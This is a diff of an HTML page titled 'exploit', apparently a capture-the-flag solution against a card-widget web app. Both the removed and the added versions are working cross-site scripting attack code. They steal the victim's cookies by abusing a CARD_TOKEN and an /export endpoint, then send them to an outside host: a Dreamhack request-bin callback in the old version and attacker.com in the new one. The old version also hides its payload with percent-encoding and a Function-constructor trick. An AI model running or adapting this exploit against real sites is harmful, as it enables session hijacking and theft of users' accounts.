@@ -1,36 +1,34 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
+<head>
+    <title>exploit</title>
+</head>
 <body>
 <script>
-window.addEventListener('DOMContentLoaded', function() {
-  const callback = "https://gxxbcfj.request.dreamhack.games/collect";
-  const widgetJs = "new Image().src='" + callback + "?c='+encodeURIComponent(document.cookie)";
-  const body =
-    "(async()=>{" +
-    "const js=" + JSON.stringify(widgetJs) + ";" +
-    "const r=await fetch('/export',{method:'POST',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:js,credentials:'include'});" +
-    "const n=await r.text();" +
-    "parent.postMessage(n,'*')" +
-    "})()";
-
-  const enc = [...body]
-    .map(c => "%" + c.charCodeAt(0).toString(16).padStart(2, "0"))
-    .join("");
-
-  const formula = "[]['filter']['con'+'structor'](unescape('" + enc + "'))()";
-
-  onmessage = function(e) {
-    location = "http://localhost:5000/review?widget=" + encodeURIComponent(e.data);
-  };
-
-  const innerScript = "setTimeout(function(){p.contentWindow.postMessage(" + JSON.stringify(formula) + ",'*')},2000);onmessage=function(e){top.postMessage(e.data,'*')};";
-
-  document.body.innerHTML =
-    "<iframe sandbox='allow-scripts' srcdoc=\"" +
-    "<iframe id=p src='http://localhost:5000/preview'></iframe>" +
-    "<script>" + innerScript + "<\\/script>" +
-    "\"></iframe>";
-});
+(async () => {
+    // 1. get token from /preview
+    const previewResp = await fetch('/preview', {credentials: 'include'});
+    const html = await previewResp.text();
+    const tokenMatch = html.match(/CARD_TOKEN\s*=\s*"([^"]+)"/);
+    if (!tokenMatch) throw new Error('token not found');
+    const token = tokenMatch[1];
+    
+    // 2. create widget
+    const widgetCode = `fetch('https://attacker.com/steal?' + document.cookie);`;
+    const exportResp = await fetch('/export', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/javascript',
+            'X-Card-Token': token
+        },
+        body: widgetCode,
+        credentials: 'include'
+    });
+    const widgetName = await exportResp.text();
+    
+    // 3. go to review page with that widget
+    location.href = '/review?widget=' + widgetName;
+})();
 </script>
 </body>
 </html>
